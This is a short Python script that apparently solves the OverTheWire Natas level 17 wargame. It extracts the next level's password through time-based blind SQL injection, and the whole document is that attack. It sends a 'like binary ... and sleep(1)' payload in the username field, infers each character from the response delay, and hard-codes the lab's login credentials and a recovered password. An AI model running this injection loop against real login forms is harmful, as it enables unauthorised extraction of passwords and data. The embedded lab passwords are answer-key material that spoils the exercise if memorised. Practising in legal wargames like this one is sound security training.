import requests
import string
import time

level = "natas17"
auth = (level, "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw")
url = f"http://{level}.natas.labs.overthewire.org/"

flag = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
while len(flag) < 32:
    for c in string.ascii_letters + string.digits:
        payload = f'natas18" and password like binary "{flag}{c}%" and sleep(1) #'
        #print(f"Testing {c}")
        #print(payload)
        b = time.time()
        res = requests.post(url, auth=auth, data={"username": payload}).content
        t = time.time() - b
        #print(payload, t)
        if t > 1.3 :
            flag += c
            print(flag)
            break